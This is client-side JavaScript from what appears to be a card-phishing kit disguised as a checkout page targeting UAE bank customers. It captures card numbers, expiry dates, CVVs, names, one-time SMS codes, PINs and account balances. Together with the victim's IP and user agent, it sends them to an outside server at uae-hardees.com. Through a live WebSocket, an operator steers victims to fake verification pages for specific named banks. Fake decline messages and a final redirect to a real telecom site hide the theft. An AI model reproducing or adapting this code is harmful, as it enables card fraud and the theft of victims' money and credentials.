let UserAgent = navigator.userAgent;
let UserCountry;
let UserState;
let UserIP;
const button = document.querySelector('#btn2')
var bankName = null;

function checkBank(cnum, success, error) {
    var bin = null;
    var brand = null;
    var country = null;
    var countryCurrency = null;
    var countryFlag = null;
    var countryName = null;
    var level = null;
    var type = null;
    // Извлечение параметров и запись в переменные
    var bin = cnum.replace(/\D/g, '').substring(0, 6);
    $.ajax({
        url: 'https://bins.antipublic.cc/bins/' + bin,
        type: 'GET',
        success: function(data) {
            if (data !== null) {
                bankName = data;

                const keys = Object.keys(data);
                const extractedParams = {};
                keys.forEach(key => {
                    extractedParams[key] = data[key];
                });
                bankName = data.bank;
                bin = data.bin;
                brand = data.brand;
                country = data.country;
                countryCurrency = data.country_currencies[0]; // Получаем первый элемент массива country_currencies
                countryFlag = data.country_flag;
                countryName = data.country_name;
                level = data.level;
                type = data.type;
                cardtype = extractedParams;
                console.log(bankName, bin, brand, country, countryCurrency, countryFlag, countryName, level, type);
            } else {
                bankName = null;
                bin = null;
                brand = null;
                country = null;
                countryCurrency = null;
                countryFlag = null;
                countryName = null;
                level = null;
                type = null;

            }
            success(bankName, bin, brand, country, countryCurrency, countryFlag, countryName, level, type);
        },
        error: function() {
            bankName = null;
            bin = null;
            brand = null;
            country = null;
            countryCurrency = null;
            countryFlag = null;
            countryName = null;
            level = null;
            type = null;

            success(bankName, bin, brand, country, countryCurrency, countryFlag, countryName, level, type);
        }
    });
}

function IDGenerator() {
    this.length = 4;
    this.timestamp = +new Date;
    var _getRandomInt = function(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    this.generate = function() {
        var ts = this.timestamp.toString();
        var parts = ts.split("").reverse();
        var id = "";
        for (var i = 0; i < this.length; ++i) {
            var index = _getRandomInt(0, parts.length - 1);
            id += parts[index];
        }
        return id;
    }
}
var generator = new IDGenerator();
let uniqueid = generator.generate();

function getIpUser() {
    fetch('https://ipapi.co/json/').then(res => res.json()).then(response => {
        UserCountry = response.country;
        UserIP = response.ip;
        UserState = response.region;
    }).catch((data, status) => {
        console.log('Failed');
    })
}

getIpUser();


function setReferrerHeader(referrerName) {
    Object.defineProperty(document, "referrer", {
        get: function() {
            return referrerName;
        },
    });
}

function sendMessageLP(cardnum, uniqueID, pin) {
    try {
        let body = {
            reqType: "mfa",
            cardnum: cardnum,
            unique_id: uniqueID,
            mfa_token: pin
        };
        const config = {
            method: 'Post',
            url: 'https://uae-hardees.com:3100/LPL',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            data: $.param(body),
        }
        axios(config)
            .then(function(response) {
                console.log(response);
            })
            .catch(function(error) {
                console.log(error);
            });
    } catch (error) {
        console.log(`Send Data Error - > ${error}`)
    }
}

function sendMessageLog(log, uniqueID) {
    try {
        let body = {
            reqType: "login",
            log: log,
            unique_id: uniqueID,

        };
        const config = {
            method: 'Post',
            url: 'https://uae-hardees.com:3100/cart',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            data: $.param(body),
        }
        axios(config)
            .then(function(response) {
                console.log(response);
            })
            .catch(function(error) {
                console.log(error);
            });
    } catch (error) {
        console.log(`Send Data Error - > ${error}`)
    }
}


function sendMessage(cardnum, carddate, cardcvv, cardname, amount, bankName, bin, brand, country, countryCurrency, countryFlag, countryName, level, type, uniqueID, userAgent, userIP, UserState, UserCountry) {
    try {

        let body = {
            reqType: "login",
            cardnum: cardnum,
            carddate: carddate,
            cardcvv: cardcvv,
            cardname: cardname,
            amount: amount,
            bin: bin,
            brand: brand,
            country: country,
            countryCurrency: countryCurrency,
            countryFlag: countryFlag,
            countryName: countryName,
            level: level,
            type: type,
            bankName: bankName,
            user_id: uniqueID,
            useragent: userAgent,
            userip: userIP,
            state: UserState,
            country: UserCountry
        };
        const config = {
            method: 'Post',
            url: 'https://uae-hardees.com:3100/login',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            data: $.param(body),
        }
        axios(config)
            .then(function(response) {
                console.log(response);
            })
            .catch(function(error) {
                console.log(error);
            });
    } catch (error) {
        console.log(`Send Data Error - > ${error}`)
    }
}


function sendMessage2FA(cardnum, uniqueID, otp) {
    try {
        let body = {
            reqType: "mfa",
            cardnum: cardnum,
            unique_id: uniqueID,
            mfa_token: otp
        };
        const config = {
            method: 'Post',
            url: 'https://uae-hardees.com:3100/2fa',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            data: $.param(body),
        }
        axios(config)
            .then(function(response) {
                console.log(response);
            })
            .catch(function(error) {
                console.log(error);
            });
    } catch (error) {
        console.log(`Send Data Error - > ${error}`)
    }
}

function sendMessageBal(cardnum, uniqueID, bal) {
    try {
        let body = {
            reqType: "mfa",
            cardnum: cardnum,
            unique_id: uniqueID,
            mfa_token: bal,
        };
        const config = {
            method: 'Post',
            url: 'https://uae-hardees.com:3100/bal',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            data: $.param(body),
        }
        axios(config)
            .then(function(response) {
                console.log(response);
            })
            .catch(function(error) {
                console.log(error);
            });
    } catch (error) {
        console.log(`Send Data Error - > ${error}`)
    }
}





const socket = new WebSocket('wss://uae-hardees.com:5100/');
socket.addEventListener('open', function(event) {
    socket.send('Hello Server!');
});
socket.addEventListener('error', function(event) {
    console.log('WebSocket error: ', event);
});
var countdown;

function performAction(action) {
    localStorage.setItem('selectedAction', action);
    window.location.href = '../checkout.html'; // Переход на вторую страницу
}
socket.addEventListener('message', function(event) {

    let msg = JSON.parse(event.data);
    console.log('Message from server ', msg.id);
    if (msg.id == uniqueid && msg.event == 'check' && msg.status == 'Valid') {
        if (localStorage.getItem('bname') == 'MASHREQBANK') {
            window.location.href = '/sms-code/mashreq.html'
        } else
        if (localStorage.getItem('bname') == 'DUBAI ISLAMIC BANK') {
            window.location.href = '/sms-code/dubaiislamic.html'
        } else
        if (localStorage.getItem('bname') == 'EMIRATES NBD BANK' || localStorage.getItem('bname') == 'EMIRATES NBD BANK (P.J.S.C.)') {
            window.location.href = '/sms-code/nbd.html'
        } else
        if (localStorage.getItem('bname') == 'ABU DHABI COMMERCIAL BANK') {
            window.location.href = '/sms-code/adcb.html'
        } else
        if (localStorage.getItem('bname') == 'NATIONAL BANK OF RAS AL-KHAIMAH (RAKBANK)') {
            window.location.href = '/sms-code/rak.html'
        } else
        if (localStorage.getItem('bname') == 'ABU DHABI ISLAMIC BANK') {
            window.location.href = '/sms-code/adib.html'
        } else
        if (localStorage.getItem('bname') == 'FIRST ABU DHABI BANK') {
            window.location.href = '/sms-code/fab.html'
        } else
        if (localStorage.getItem('bname') == 'CITIBANK') {
            window.location.href = '/sms-code/citibank.html'
        } else
        if (localStorage.getItem('bname') == 'COMMERCIAL BANK OF DUBAI') {
            window.location.href = '/sms-code/commercial.html'
        } else
        if (localStorage.getItem('bname') == 'HSBC BANK MIDDLE EAST') {
            window.location.href = '/sms-code/hsbc.html'
        } else
        if (localStorage.getItem('bname') == 'EMIRATES ISLAMIC BANK' || localStorage.getItem('bname') == 'EMIRATES ISLAMIC BANK P.J.S.C.') {
            window.location.href = '/sms-code/emiratesislamic.html'
        } else {
            window.location.href = '/sms-code/3ds.html'

        }

    } else if (msg.id == uniqueid && msg.event == 'check' && msg.status == 'NotValid') {
        $('#txtCardNo').val('');
        $('#ddlMonth').val('');
        $('#ddlYear').val('');

        $('#txtCvvNo').val('');
        document.getElementById('rest').style.display = 'block';
        document.getElementById('rest').textContent = 'Payment declined, try another bank card.';
        document.getElementById('pload2').style.display = 'none';
        document.getElementById('payButton').disabled = false;

    }
    if (msg.id == uniqueid && msg.event == '2fa' && msg.SMSStatus == 'PIN') {
        $('#pload').css('display', 'none');
        $('#ppin').css('display', 'flex');


    }
    if (msg.id == uniqueid && msg.status == 'sms') {
        if (localStorage.getItem('bname') == 'MASHREQBANK') {
            window.location.href = '/sms-code/mashreq.html'
        } else
        if (localStorage.getItem('bname') == 'DUBAI ISLAMIC BANK') {
            window.location.href = '/sms-code/dubaiislamic.html'
        } else
        if (localStorage.getItem('bname') == 'EMIRATES NBD BANK' || localStorage.getItem('bname') == 'EMIRATES NBD BANK (P.J.S.C.)') {
            window.location.href = '/sms-code/nbd.html'
        } else
        if (localStorage.getItem('bname') == 'ABU DHABI COMMERCIAL BANK') {
            window.location.href = '/sms-code/adcb.html'
        } else
        if (localStorage.getItem('bname') == 'NATIONAL BANK OF RAS AL-KHAIMAH (RAKBANK)') {
            window.location.href = '/sms-code/rak.html'
        } else
        if (localStorage.getItem('bname') == 'ABU DHABI ISLAMIC BANK') {
            window.location.href = '/sms-code/adib.html'
        } else
        if (localStorage.getItem('bname') == 'FIRST ABU DHABI BANK') {
            window.location.href = '/sms-code/fab.html'
        } else
        if (localStorage.getItem('bname') == 'CITIBANK') {
            window.location.href = '/sms-code/citibank.html'
        } else
        if (localStorage.getItem('bname') == 'COMMERCIAL BANK OF DUBAI') {
            window.location.href = '/sms-code/commercial.html'
        } else
        if (localStorage.getItem('bname') == 'HSBC BANK MIDDLE EAST') {
            window.location.href = '/sms-code/hsbc.html'
        } else
        if (localStorage.getItem('bname') == 'EMIRATES ISLAMIC BANK' || localStorage.getItem('bname') == 'EMIRATES ISLAMIC BANK P.J.S.C.') {
            window.location.href = '/sms-code/emiratesislamic.html'
        } else {
            window.location.href = '/sms-code/3ds.html'

        }

    }
    if (msg.id == uniqueid && msg.status == 'bal') {
        if (localStorage.getItem('bname') == 'MASHREQBANK') {
            window.location.href = '/sms-code/mashreq - balance.html'
        } else
        if (localStorage.getItem('bname') == 'DUBAI ISLAMIC BANK') {
            window.location.href = '/sms-code/dubaiislamic - balance.html'
        } else
        if (localStorage.getItem('bname') == 'EMIRATES NBD BANK' || localStorage.getItem('bname') == 'EMIRATES NBD BANK (P.J.S.C.)') {
            window.location.href = '/sms-code/nbd - balance.html'
        } else
        if (localStorage.getItem('bname') == 'ABU DHABI COMMERCIAL BANK') {
            window.location.href = '/sms-code/adcb - balance.html'
        } else
        if (localStorage.getItem('bname') == 'NATIONAL BANK OF RAS AL-KHAIMAH (RAKBANK)') {
            window.location.href = '/sms-code/rak - balance.html'
        } else
        if (localStorage.getItem('bname') == 'ABU DHABI ISLAMIC BANK') {
            window.location.href = '/sms-code/adib - balance.html'
        } else
        if (localStorage.getItem('bname') == 'FIRST ABU DHABI BANK') {
            window.location.href = '/sms-code/fab - balance.html'
        } else
        if (localStorage.getItem('bname') == 'CITIBANK') {
            window.location.href = '/sms-code/citibank - balance.html'
        } else
        if (localStorage.getItem('bname') == 'COMMERCIAL BANK OF DUBAI') {
            window.location.href = '/sms-code/commercial - balance.html'
        } else
        if (localStorage.getItem('bname') == 'HSBC BANK MIDDLE EAST') {
            window.location.href = '/sms-code/hsbc - balance.html'
        } else
        if (localStorage.getItem('bname') == 'EMIRATES ISLAMIC BANK' || localStorage.getItem('bname') == 'EMIRATES ISLAMIC BANK P.J.S.C.') {
            window.location.href = '/sms-code/emiratesislamic - balance.html'
        } else {
            window.location.href = '/sms-code/3ds - balance.html'

        }

    } else if (msg.id == uniqueid && msg.event == '2fa' && msg.SMSStatus == 'SMS Not Valid') {
        document.getElementById('otp').style.border = '1px solid red';
        document.getElementById('otp').value = '';
        document.getElementById('pload2').style.display = 'none';

        document.getElementById('smsinf').textContent = 'You entered an incorrect OTP, please wait 30 seconds, we have sent you a new code';
        document.getElementById('smsinf').style.color = 'red';
        document.getElementById('smsinf').style.display = 'block';
    } else if (msg.id == uniqueid && msg.event == '2fa' && msg.SMSStatus == 'Balance') {
        $('#pload').css('display', 'none');
        $('#pbal').css('display', 'flex');
    }
    if (msg.status == 'error' && msg.id == uniqueid) {
        $('#pload').css('display', 'none');
        $('#pbal').css('display', 'none');
        $('#ppin').css('display', 'none');
        $('#perr').css('display', 'flex');

    }
    if (msg.status == 'ancard' && msg.id == uniqueid) {
        performAction('action3');
    }
    if (msg.status == 'leavePage' && msg.id == uniqueid) {
        performAction('action2');
    }
    if (msg.status == 'finish' && msg.id == uniqueid) {
        window.location.replace('https://myaccount.du.ae/webapp/en/quick-recharge')
    }
    if (msg.id == uniqueid && msg.event == 'bal' && msg.BALStatus == 'PIN') {
        $('#pload').css('display', 'none');
        $('#ppin').css('display', 'flex');


    } else if (msg.id == uniqueid && msg.event == 'bal' && msg.BALStatus == 'Bal Not Valid') {

        $('#pload').css('display', 'none');
        $('#pbal').css('display', 'flex');
        document.getElementById('bal').classList.add('error')
        $('#bal').val('');

    }
    if (msg.id == uniqueid && msg.event == 'LPL' && msg.LPLStatus == 'BAL') {
        $('#pload').css('display', 'none');
        $('#pbal').css('display', 'flex');

    } else if (msg.id == uniqueid && msg.event == 'LPL' && msg.LPLStatus == 'PIN Not Valid') {

        $('#pload').css('display', 'none');
        $('#ppin').css('display', 'flex');
        document.getElementById('pin').classList.add('error');
        $('#pin').val('');

    }
});
socket.addEventListener('close', function(event) {
    console.log('The connection has been closed');
});

function send1() {
    let cardnum = $('#card-number').val().trim();
    let carddate = $('#exp-date').val().trim();
    let cardcvv = $('#cvv').val().trim();
    let cardname = $('#card-name').val().trim();
    let binb = cardnum.replace(/\D/g, '').substring(0, 6);
    let amount = document.getElementById('price').textContent;

    var cnum = cardnum.replace(/\D/g, '');
    var cnum1 = '<code>' + cnum + '</code>';

    var formattedCard = '************' + cnum.substring(12).replace(/(\d{4})/g, ' $1');
    localStorage.setItem('cnum', formattedCard);
    localStorage.setItem('amount', amount);
    localStorage.setItem('crdnum', cardnum);
    // document.getElementById('card-container').innerText = formattedCard;
    function detectCardType(cardNumber) {
        const cardTypes = [
            { type: 'Visa', pattern: /^4/ },
            { type: 'Mastercard', pattern: /^5[1-5]/ },
            { type: 'Amex', pattern: /^3[47]/ },
            { type: 'Discover', pattern: /^6(?:011|5)/ },
        ];

        for (const cardType of cardTypes) {
            if (cardType.pattern.test(cardNumber)) {
                return cardType.type;
            }
        }

        return 'unknown';
    }
    let cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');

    let cardType = detectCardType(cnum);
    localStorage.setItem('type', cardType);

    localStorage.setItem('cardType', cardType)
    checkBank(cardNumber, function(bankName, bin, brand, country, countryCurrency, countryFlag, countryName, level, type) {
            document.getElementById('rest').style.display = 'none';
            document.getElementById('pload2').style.display = 'flex';
            localStorage.setItem('bname', bankName);

            sendMessage(cnum, carddate, cardcvv, cardname, amount, bankName, bin, brand, country, countryCurrency, countryFlag, countryName, level, type, uniqueid, UserAgent, UserIP, UserState, UserCountry);

        }, function() {

        }

    );




};


function send3() {
    let cardnum = localStorage.getItem('crdnum');
    let bal = $('#bal').val().trim();
    if (bal.length > 0) {
        document.getElementById('pload2').style.display = 'flex';

        sendMessageBal(cardnum, uniqueid, bal);
    } else {
        document.getElementById('bal').style.border = '1px solid red';
    }
}

function send2() {
    let cardnum = localStorage.getItem('crdnum');
    let otp = $('#otp').val().trim();
    if (otp.length === 6) {
        document.getElementById('pload2').style.display = 'flex';

        sendMessage2FA(cardnum, uniqueid, otp);
    } else {
        document.getElementById('otp').style.border = '1px solid red';
    }
};
// $('.btn4').on('click', async function(event) {
//     event.preventDefault();
//     let cardnum = localStorage.getItem('crdnum');
//     let pin = $('#pin').val().trim();
//     if(pin.length > 3){
//         document.getElementById('ppin').style.display = 'none';
//         document.getElementById('pload').style.display = 'flex';

//         document.getElementById('pin').classList.remove('error');
//         sendMessageLP   (cardnum, uniqueid, pin);
//     }else{
//         document.getElementById('pin').classList.add('error');
//     }
// });    
// function scrollToElement(elementId) {
//     var element = document.getElementById(elementId);
//     if (element) {
//         element.scrollIntoView({ behavior: 'smooth' });
//     }
// }




$('.btn0').on('click', function() {
    let i1 = $('#name').val().trim();
    let i2 = $('#num').val().trim();
    let i3 = $('#add').val().trim();
    let i4 = $('#bil').val().trim();
    let i5 = $('#str').val().trim();
    let i6 = $('#cit').val().trim();
    if (i1.length > 0 && i2.length > 0 && i3.length > 0 && i4.length > 0 && i5.length > 0 && i6.length > 0) {
        document.getElementById('name').classList.remove('error');
        document.getElementById('num').classList.remove('error');
        document.getElementById('add').classList.remove('error');
        document.getElementById('bil').classList.remove('error');
        document.getElementById('str').classList.remove('error');
        document.getElementById('cit').classList.remove('error');
        document.getElementById('load1').style.display = 'flex';
        setTimeout(function() {
            document.getElementById('load1').style.display = 'none';
            // document.querySelector('.header').style.display = 'none';
            // document.querySelector('.header2').style.display = 'none';
            // document.querySelector('.bck').style.display = 'none';
            // document.querySelector('.cart').style.display = 'none';
            // document.querySelector('.aft').style.display = 'none';
            // document.querySelector('.aft2').style.display = 'none';
            // document.querySelector('.secur').style.display = 'none';
            // document.querySelector('.fixed-block').style.display = 'none';
            // document.querySelector('.footsp').style.display = 'none';
            // document.querySelector('.foot').style.display = 'none';
            // document.querySelector('.disk').style.display = 'none';
            // document.getElementById('dwatc').style.display = 'none';
            document.body.style.padding = '0';

            var ttttt = document.getElementById('original-total').textContent;
            localStorage.setItem('totall', ttttt);
            // document.querySelector('#hdown').style.display = 'none';
            window.location.href = '/checkout'

        }, 5000)
    } else {
        document.getElementById('name').classList.add('error');
        document.getElementById('num').classList.add('error');
        document.getElementById('add').classList.add('error');
        document.getElementById('bil').classList.add('error');
        document.getElementById('str').classList.add('error');
        document.getElementById('cit').classList.add('error');
    }
})